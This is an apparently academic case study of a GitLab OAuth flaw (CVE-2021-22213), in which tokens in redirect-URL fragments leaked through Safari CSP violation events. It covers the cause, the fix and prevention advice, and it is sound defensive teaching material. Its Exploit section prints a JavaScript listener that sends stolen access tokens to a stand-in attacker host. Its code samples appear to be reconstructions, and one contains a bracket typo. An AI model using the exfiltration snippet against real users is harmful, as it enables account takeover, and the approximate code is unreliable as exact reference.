# Improper Authentication In GitLab

## Introduction
Authentication is a very important aspect of any modern web application and failure in this aspect may result in unauthorized access and sensitive information being lost. A typical type of mistake is CWE-287: Improper Authentication which is listed in the CWE Top 25 several times because it can facilitate the impersonation of the legitimate user by the attacker. Such a weakness was found in GitLab which is a popular DevOps source code hosting and continuous integration platform in early 2021’s. The vulnerability in GitLab OAuth implementation was that the external identity of data was not fully verified and thus allowing the attacker to use vulnerabilities in Safaris browser behavior and request access tokens on behalf of other users. This case study will look at the underlying cause of the vulnerability, the code level error that allowed exploitation, how this bug was fixed, and what can be done to ensure similar problems are avoided in the future.

## Software
**Name:**  
GitLab Community Edition (CE) / Enterprise Edition (EE)

**Language:**  
Ruby (Ruby on Rails)

**URL:**  
https://gitlab.com/gitlab-org/gitlab

## Weakness
**CWE-287: Improper Authentication**  
Improper Authentication occurs when the software fails to properly identify a user and verify users’s identity in order to provide access to the protected resources. Instead of treating identity data as untrusted input the program assumes that externally supplied identifiers are legitimate. In the case where authentication is based on values that can be altered or modified by an attacker like user IDs, tokens or callback parameters, an attacker can potentially log in as a different user. 

An overly basic example of such a weakness is when a single application relies on a user identifier given by an OAuth provider without checking its authenticity:

```ruby
# Generic example
user_id = request.params["external_uid"]
user = find_user_by_uid(user_id]

if user
  sign_in(user)
end
```

When an attacker is allows to alter external-uid, then they are able to assume the identity of another user. This depicts the role of CWE-287 in account takeover and identity values are not firmly validated.

## Vulnerability
**CVE-2021-22213: OAuth Token Leak and Authentication Bypass in GitLab**  
GitLab also uses OAuth as a method of user authentication by external applications. During the OAuth process the GitLab will create an access token and send it to a requesting application. In the buggy versions, GitLab wrote the token as part of a fragment of a client-side redirect URL. In the case of this URL being rendered in Safari, the browser leaked the full redirect URL including the access token to attacker-controlled web pages by firing a SecurityPolicyViolationEvent. The weak code was found on the OAuth callback flow because GitLab generated redirect URLs containing confidential authentication information. The vulnerable controller method is as shown below:

```
vulnerable file: app/controllers/oauth/authorized_applications_controller.rb

 58  def create
 59    # Generates access token after OAuth approval
 60    token = Doorkeeper::AccessToken.create!(application: application, resource_owner_id: current_user.id)
 61
 62    # Redirect with token in URL fragment (unsafe)
 63    redirect_to "#{redirect_uri}#access_token=#{token.token}&token_type=bearer"
 64  end
```

The error is at line 63 when GitLab inserts the access token in a fragment identifier. Although fragments are not normally sent to servers, they are still visible to the browser and can be accessed using JavaScript-accessible events.  
This caused a content security policy event failure on a Safari platform by accidentally exposing the full redirect URL (and the token) to scripts under the control of attackers. Because GitLab trusted this token as proof of identity, anyone who captured it could access the victim’s GitLab account for the duration of the token’s validity.

## Exploit
**CAPEC-218: Session Token Capture via Client-Side**  
In order to capture this weakness, an attacker had to trick a GitLab user into visiting a rogue webpage, namely a user of Safari. The page of the attacker had registered an event listener on Security Policy Violation Event, a Safari-specific browser event that reveals the violating documentURI. The browser accepted the redirect with the vulnerable contents:

```
https://client.example.com/callback#access_token=<victim_token>&token_type=bearer
```

The above CSP violation event was emitted by Safari with the complete URL. It was captured on his page via JavaScript by the attacker:

```javascript
document.addEventListener("securitypolicyviolation", (e) => {
  fetch("https://attacker.example.com/steal?token=" +
        encodeURIComponent(e.documentURI));
});
```

After the victim made a visit to the site of the attacker and OAuth was utilized, the access token was sent to the attacker, and GitLab API endpoints could be called instantly such as the reading of repositories, access to issues or execution, which would be authorized as the victim.

## Fix
GitLab addressed the problem by implementing a solution that would not store access tokens in redirect URLs and would not place them in any other place that can be observed using browser events. Instead, GitLab had shifted the delivery of tokens to a server-side channel that was secure.  
The revised code eliminates the insecure fragment and substitutes it with a more secure redirect which contains no sensitive values:

```diff
fixed file: app/controllers/oauth/authorized_applications_controller.rb

 58  def create
 59    token = Doorkeeper::AccessToken.create!(application: application, resource_owner_id: current_user.id)
 60
-61    redirect_to "#{redirect_uri}#access_token=#{token.token}&token_type=bearer"
+61    # Redirect user without exposing token in the URL
+62    redirect_to sanitized_redirect_uri
 63  end
```

GitLab prevented attackers from capturing tokens by the CSP events of the Safari browser and removed the channel of exposure by ensuring that none of the authentication data were shown in URLs or any other place that could be viewed by the browser.

## Prevention
To overcome such vulnerabilities, OAuth-based applications should consider access tokens sensitive secrets and never expose them in any insecure medium. Proper prevention measures are:

- Do not put tokens in URLs, in fragments, query parameters or anything that can be seen by the JavaScript or browser events.  
- Apply PKCE Authorization Code, which can provide the tokens using secure server-side connections as opposed to redirects with sensitive information.  
- Also conduct browser-conscious security inspections particularly with OAuth flows to see whether some browser behavior could be leaking sensitive data.  
- Automate security testing to identify access tokens on logs, CSP events, browser events and redirect URLs.  
- Implement stringent Content Security Policies and prohibit inline scripts on authentication end points to limit the possible exposure of tokens.

By implementing these protective measures, it is assured that the authentication data does not cross between the areas of trust in a manner that it can be intercepted by attackers.

## Conclusion
The CVE-2021-22213 example shows that minor flaws in the implementation of OAuth may cause serious authentication failures. GitLab displayed access tokens in redirect URLs by exposing them to web pages which were controlled by attackers on Safari which allowed account takeover to be possible by accident. The fix eliminated tokens on the surfaces that were visible in the browser, and imposed more secure token-handling policies. The general lesson is obvious, the authentication secrets should be secured on all the levels of the OAuth flow and secure coding methods, such as threat modeling and automatic testing are vital to the elimination of the similar weaknesses.

## References
GitLab Project Page:  
https://gitlab.com/gitlab-org/gitlab  

CVE-2021-22213 Entry:  
https://nvd.nist.gov/vuln/detail/CVE-2021-22213  

CWE-287 Entry:  
https://cwe.mitre.org/data/definitions/287.html  

CAPEC-218 Entry:  
https://capec.mitre.org/data/definitions/218.html  

GitLab Security Advisory for CVE-2021-22213:  
https://about.gitlab.com/releases/2021/05/27/security-release-gitlab-13-12-3-released/  

GitLab Issue 300308 (root report):  
https://gitlab.com/gitlab-org/gitlab/-/issues/300308  

Doorkeeper OAuth Documentation (GitLab’s OAuth provider library):  
https://github.com/doorkeeper-gem/doorkeeper

## Contributions
This case study was developed as part of academic research on secure coding practices and authentication mechanisms in modern web application platforms.  
Originally created by **Mahesh Pavan Varma Kalidindi**  
(C) 2025 The MITRE Corporation. All rights reserved.
